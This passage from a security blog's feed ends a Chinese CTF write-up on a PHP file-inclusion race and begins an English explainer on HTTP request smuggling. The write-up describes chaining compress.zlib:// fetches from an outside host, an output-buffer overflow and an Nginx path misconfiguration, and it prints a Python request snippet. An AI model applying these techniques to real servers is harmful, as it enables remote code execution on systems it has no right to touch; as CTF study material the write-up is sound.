<span class="hljs-string">'&lt;?'</span>) === <span class="hljs-keyword">false</span>) {</span><br><span class="line">    <span class="hljs-keyword">include_once</span>($_POST[<span class="hljs-string">'file'</span>]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这个地方问了很多师傅，包括一血的 TokyoWesterns 的队员以及参考了主要的公开 WP，基本都是利用两个函数之间极端的时间窗进行绕过。</p><p>什么意思呢？也就是说，在极其理想的情况下，我们通过自己的服务先发送一段垃圾数据，这时候通过<code>stripos</code>的判断就是没有 PHP 代码的文件数据，接着我们利用 HTTP 长链接的形式，只要这个链接不断开，在我们绕过第一个判断之后，我们就可以发送第二段含有 PHP 代码的数据了，这样就能使<code>include_once</code>包含我们的代码了。</p><p>因为我们无法知道什么时候能绕过第一个判断，所以这里的方法只能利用竞争的形式去包含临时文件，这里是第二个我们需要竞争的点。</p><h3 id="Leak-Dir-path"><a href="#Leak-Dir-path" class="headerlink" title="Leak Dir path"></a>Leak Dir path</h3><p>最后，要做到文件包含，自然得先知道它的文件路径，而文件路径每次都是随机的，所以我们又不得不通过某些方式去获取路径。</p><p>虽然我们可以直接看到题目是直接给出了路径，但是乍一看代码我们貌似只能等到全部函数结束之后才能拿到路径，然而之前我们说到的需要保留的长链接不能让我们立即得到我们的 sandbox 路径。</p><p>所以我们需要通过传入过大的 name 参数，导致 PHP output buffer 溢出，在保持连接的情况下获取沙箱路径，参考代码：</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    data = <span class="hljs-string">'''file=compress.zlib://http://192.168.151.132:8080&amp;name='''</span>.strip() + <span class="hljs-string">'a'</span> * (<span class="hljs-number">1024</span> * <span class="hljs-number">7</span> + <span class="hljs-number">882</span>)</span><br><span class="line">    r.send(<span class="hljs-string">'''POST / HTTP/1.1\r</span></span><br><span class="line"><span class="hljs-string">Host: localhost\r</span></span><br><span class="line"><span class="hljs-string">Connection: close\r</span></span><br><span class="line"><span class="hljs-string">Content-Length: {}\r</span></span><br><span class="line"><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span></span><br><span class="line"><span class="hljs-string">Cookie: PHPSESSID=asdasdasd\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">{}\r</span></span><br><span class="line"><span class="hljs-string">'''</span>.format(len(data), data))</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Get-Flag"><a href="#Get-Flag" class="headerlink" title="Get Flag"></a>Get Flag</h3><p>所以整个流程我们可以总结为以下：</p><ol><li>利用 <code>compress.zlib://http://</code>or<code>compress.zlib://ftp://</code> 来上传任意文件，并保持 HTTP 长链接竞争保存我们的临时文件</li><li>利用超长的 name 溢出 output buffer 得到 sandbox 路径</li><li>利用 Nginx 配置错误，通过 <code>.well-known../files/sandbox/</code>来获取我们 tmp 文件的文件名</li><li>发送另一个请求包含我们的 tmp 文件，此时并没有 PHP 代码</li><li>绕过 WAF 判断后，发送 PHP 代码段，包含我们的 PHP 代码拿到 Flag </li></ol><p>整个题目的关键点主要是以下几点(来自 @wupco)：</p><ol><li>需要利用大文件或ftp速度限制让连接保持</li><li>传入name过大 overflow output buffer，在保持连接的情况下获取沙箱路径</li><li>tmp文件需要在两种文件直接疯狂切换，使得第一次<code>file_get_contents</code>获取的内容不带有<code>&lt;?</code>,<code>include</code>的时候是正常php代码，需要卡时间点，所以要多跑几次才行</li><li><code>.well-known../files/</code>是nginx配置漏洞，就不多说了，用来列生成的tmp文件</li></ol><p>由于第二个极短的时间窗，我们需要比较准确地调控延迟时间，之前没调控好时间以及文件大小，挂一晚上脚本都没有 hit 中一次，第二天经过 @rebirth 的深刻指点，修改了一下延迟时间以及服务器响应的文件的大小，成功率得到了很大的提高，基本每次都可以 getflag。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107214803.png" alt=""></p><p>脚本放在<a href="https://gist.github.com/ZeddYu/42159da911e82dba923b375a9f64ad65" target="_blank" rel="noopener">gist-exp.py</a>，其中 192.168.34.1 是本地题目地址，192.168.151.132 是 client 的地址。</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/" target="_blank" rel="noopener">20191228-hxp36c3ctf</a></p><p><a href="https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0" target="_blank" rel="noopener">https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0</a></p><p><a href="https://ctftime.org/task/10211" target="_blank" rel="noopener">https://ctftime.org/task/10211</a></p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;签到选手不请自来，经过了好几天的琢磨，终于把这次比赛的题目都弄得差不多了，这里记录一下本次比赛 Web 题目的解法。&lt;/p&gt;
&lt;blockquote class=&quot;colorquote success&quot;&gt;&lt;p&gt;文章首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/7081&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/7081&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Help you understand HTTP Smuggling in one article</title>
    <link href="https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/"/>
    <id>https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/</id>
    <published>2019-12-08T17:09:00.000Z</published>
    <updated>2021-09-27T17:45:58.716Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>This year’s Defcon 27 and Black Hat both mentioned HTTP DESYNC ATTACKS. I wanted to take the time to study it a few months ago, but I haven’t had much time. I recently took a look at it.</p><p>Sorry for my bad English. If you can read Chinese, I recommend you to read this in Chinese. The Chinese part is here <a href="https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/">一篇文章带你读懂 HTTP Smuggling 攻击</a>.</p><a id="more"></a><p>When I researched the other day, it happened that <strong>mengchen@Knownsec 404 Team</strong> also published an <a href="https://paper.seebug.org/1049/" target="_blank" rel="noopener">article</a>, which also brought me more inspiration. The author’s article is very good. I strongly recommend reading it. Here I combine the author’s article with some of my own understanding. This article can also be understood as a supplement and a more detailed description of that article.</p><p>The entire article was delayed for about two months because of my time. The middle time interval may be longer, so the article will have more omissions, please forgive me. It is not easy to write. Recently, I have been paying attention to this aspect of security issues. Welcome to study and discuss together: ) Contact: emVkZHl1Lmx1QGdtYWlsLmNvbQ==</p><p>In the future, if there is a new summary, I will also send my <a href="https://blog.zeddyu.info">blog</a>.</p><h1 id="TL-NR"><a href="#TL-NR" class="headerlink" title="TL;NR"></a>TL;NR</h1><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520131941.jpg" alt=""></p><p>Pic from <a href="https://twitter.com/SpiderSec/status/1200413390339887104?s=19" target="_blank" rel="noopener">https://twitter.com/SpiderSec/status/1200413390339887104?s=19</a></p><h1 id="TimeLine"><a href="#TimeLine" class="headerlink" title="TimeLine"></a>TimeLine</h1><p>Before we mention HTTP Smuggling, let’s take a look at the evolution process:</p><p>@Amit Klein proposed the <a href="https://dl.packetstormsecurity.net/papers/general/whitepaper_httpresponse.pdf" target="_blank" rel="noopener">HTTP Response Splitting</a> technology in 2004, which is the prototype of the HTTP Smuggling attack.</p><p>About HTTP Smuggling This attack method was first proposed by @Watchfire in 2005 <a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank" rel="noopener">HTTP Request Smuggling</a>.</p><p>HTTP Parameter Pollution (HPP), also known as HTTP parameter pollution, is actually a special HTTP Smuggling attack. It was first proposed by @Stefano di Paola &amp; @Luca Carettoni at the OWASP Poland conference in 2009. It caused a big sensation and was widely used in bypassing WAF.</p><p>Defcon 24 in 2016, @regilero proposed [Hiding Wookiees In Http]([<a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%" target="_blank" rel="noopener">https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%</a> 20Regilero-Hiding-Wookiees-In-Http.pdf] (<a href="https://media.defcon.org/DEF" target="_blank" rel="noopener">https://media.defcon.org/DEF</a> CON 24 / DEF CON 24 presentations / DEF CON 24-Regilero-Hiding-Wookiees-In-Http.pdf)), Further reveals the HTTP Smuggling attack.</p><p>Defcon 27 in 2019, @James Kettle proposed [HTTP Desync Attacks: Smashing into the Cell Next Door]([<a href="https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-" target="_blank" rel="noopener">https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-</a> 27-albinowax-HTTP-Desync-Attacks.pdf] (<a href="https://media.defcon.org/DEF" target="_blank" rel="noopener">https://media.defcon.org/DEF</a> CON 27 / DEF CON 27 presentations / DEFCON-27-albinowax-HTTP-Desync-Attacks.pdf)), explained How to use PayPal vulnerability with HTTP Smuggling technology.</p><h1 id="Causes"><a href="#Causes" class="headerlink" title="Causes"></a>Causes</h1><p>However, @James Kettle’s PPT did not describe in detail what the attack was and how it was formed. At first, I still had very big doubts after reading it. Then I learned about the <a href="https://regilero.github.io/tag/Smuggling/" target="_blank" rel="noopener">HTTP Smuggling’s in the @regilero blog. Article</a>, I have a clear understanding.</p><h2 id="HTTP-Connection-Mod"><a href="#HTTP-Connection-Mod" class="headerlink" title="HTTP Connection Mod"></a>HTTP Connection Mod</h2><p>In the protocol design before <code>HTTP1.0</code>, every time a client makes an HTTP request, it needs to establish a TCP connection with the server. Modern web site pages are composed of multiple resources. We need to obtain the content of a web page, not only request HTML documents, but also various resources such as JS, CSS, and images. , It will cause the load overhead of the HTTP server to increase. So in <code>HTTP1.1</code>,<code>Keep-Alive</code> and <code>Pipeline</code> were added.</p><h3 id="Keep-Alive"><a href="#Keep-Alive" class="headerlink" title="Keep-Alive"></a>Keep-Alive</h3><p>According to <a href="https://tools.ietf.org/html/rfc7230#section-6" target="_blank" rel="noopener">RFC7230</a>:</p><blockquote><p>​    HTTP/1.1 defaults to the use of “persistent connections”, allowing multiple requests and responses to be carried over a single connection.  The “close” connection option is used to signal that a connection will not persist after the current request/response.  HTTP implementations SHOULD support persistent connections.</p></blockquote><p>Keep-Alive is used by default in HTTP/1.1, allowing multiple requests and responses to be hosted on a single connection.</p><blockquote><p>​    The so-called <code>Keep-Alive</code>, is to add a special request header <code>Connection: Keep-Alive</code> in the HTTP request, tell the server, after receiving this HTTP request, do not close the TCP link, followed by the same target server HTTP Request, reuse this TCP link, so only need to perform a TCP handshake process, which can reduce server overhead, save resources, and speed up access. Of course, this feature is enabled by default in <code>HTTP1.1</code>.</p></blockquote><p>Of course, some requests carry <code>Connection: close</code>, after the communication is completed, the server will interrupt the TCP connection.</p><h3 id="Pipline"><a href="#Pipline" class="headerlink" title="Pipline"></a>Pipline</h3><blockquote><p>With <code>Keep-Alive</code>, there will be a <code>Pipeline</code>, and the client can send its own HTTP request like a pipeline without waiting for the response from the server. After receiving the request, the server needs to follow the first-in first-out mechanism, strictly correlate the request and response, and then send the response to the client.</p><p>Nowadays, the browser does not enable <code>Pipeline</code> by default, but the general server provides support for <code>Pipleline</code>.</p></blockquote><p>The more important introduction in HTTP / 1.1 is the pipeline technology. The following is a comparison chart with and without piepeline technology:</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520134869.png" alt=""></p><p>We can clearly see that after using the pipeline, there is no need to wait for the previous request to complete its response before processing the second request. This is like asynchronous processing.</p><h2 id="Message-Body"><a href="#Message-Body" class="headerlink" title="Message Body"></a>Message Body</h2><p><a href="https://tools.ietf.org/html/rfc7230#section-3.3" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7230#section-3.3</a></p><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><blockquote><pre><code>Transfer-Encoding is analogous to the Content-Transfer-Encoding field of MIME, which was designed to enable safe transport of binary data over a 7-bit transport service ([RFC2045], Section 6).  However, safe transport has a different focus for an 8bit-clean transfer protocol. In HTTP's case, Transfer-Encoding is primarily intended to accurately delimit a dynamically generated payload and to distinguish payload encodings that are only applied for transport efficiency or security from those that are characteristics of the selected resource.</code></pre></blockquote><p>Transfer-Encoding is a field designed to support the secure transmission of binary data by 7-bit transfer services. It is somewhat similar to Content-Transfer-Encoding in the MIME (Multipurpose Internet Mail Extensions) header. In the case of HTTP, Transfer-Encoding is mainly used to encode the payload body in a specified encoding form for secure transmission to the user. Introduced in HTTP/1.1 and deprecated in HTTP/2.</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding" target="_blank" rel="noopener">MDN</a> lists several attributes:</p><p></p><figure class="highlight coq hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunked | <span class="hljs-type">compress</span> | <span class="hljs-type">deflate</span> | <span class="hljs-type">gzip</span> | <span class="hljs-type">identity</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Here we mainly focus on chunked, a transmission encoding method, which is not mentioned for the first time in a network attack. It also used in bypassing WAF frequently.</p><p>We can see the definition specification of chunk transmission in <a href="https://tools.ietf.org/html/rfc7230#section-4.1" target="_blank" rel="noopener">RFC7230</a>.</p><blockquote><p>4.1.  Chunked Transfer Coding</p><p>   The chunked transfer coding wraps the payload body in order to<br>   transfer it as a series of chunks, each with its own size indicator,<br>   followed by an OPTIONAL trailer containing header fields.  Chunked<br>   enables content streams of unknown size to be transferred as a<br>   sequence of length-delimited buffers, which enables the sender to<br>   retain connection persistence and the recipient to know when it has<br>   received the entire message.</p><pre><code>chunked-body   = *chunk                 last-chunk                 trailer-part                 CRLFchunk          = chunk-size [ chunk-ext ] CRLF                 chunk-data CRLFchunk-size     = 1*HEXDIGlast-chunk     = 1*("0") [ chunk-ext ] CRLFchunk-data     = 1*OCTET ; a sequence of chunk-size octets</code></pre><p>   The chunk-size field is a string of hex digits indicating the size of<br>   the chunk-data in octets.  The chunked transfer coding is complete<br>   when a chunk with a chunk-size of zero is received, possibly followed<br>   by a trailer, and finally terminated by an empty line.</p><p>   A recipient MUST be able to parse and decode the chunked transfer<br>   coding.</p><p>4.1.1.  Chunk Extensions</p><p>   The chunked encoding allows each chunk to include zero or more chunk<br>   extensions, immediately following the chunk-size, for the sake of<br>   supplying per-chunk metadata (such as a signature or hash),<br>   mid-message control information, or randomization of message body<br>   size.</p><pre><code>chunk-ext      = *( ";" chunk-ext-name [ "=" chunk-ext-val ] )chunk-ext-name = tokenchunk-ext-val  = token / quoted-string</code></pre><p>   The chunked encoding is specific to each connection and is likely to<br>   be removed or recoded by each recipient (including intermediaries)<br>   before any higher-level application would have a chance to inspect<br>   the extensions.  Hence, use of chunk extensions is generally limited</p><p>   to specialized HTTP services such as “long polling” (where client and<br>   server can have shared expectations regarding the use of chunk<br>   extensions) or for padding within an end-to-end secured connection.</p><p>   A recipient MUST ignore unrecognized chunk extensions.  A server<br>   ought to limit the total length of chunk extensions received in a<br>   request to an amount reasonable for the services provided, in the<br>   same way that it applies length limitations and timeouts for other<br>   parts of a message, and generate an appropriate 4xx (Client Error)<br>   response if that amount is exceeded.</p></blockquote><p>If you don’t want to look too carefully here, we just need to understand what kind of structure it is. You can also refer to <a href="https://en.wikipedia.org/wiki/Chunked_transfer_encoding" target="_blank" rel="noopener">Wiki: Chunked transfer encoding</a>, for example if we want to send the following message using chunked.</p><p></p><figure class="highlight taggerscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wikipedia in<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>chunks.</span><br></pre></td></tr></tbody></table></figure><p></p><p>We can send it like this:</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POSTT</span> <span class="hljs-string">/xxx</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: xxx</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/plain </span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">4\r\n</span></span><br><span class="line"><span class="hljs-attribute">Wiki\r\n</span></span><br><span class="line"><span class="hljs-attribute">5\r\n</span></span><br><span class="line"><span class="hljs-attribute">pedia\r\n</span></span><br><span class="line"><span class="hljs-attribute">e\r\n</span></span><br><span class="line"> 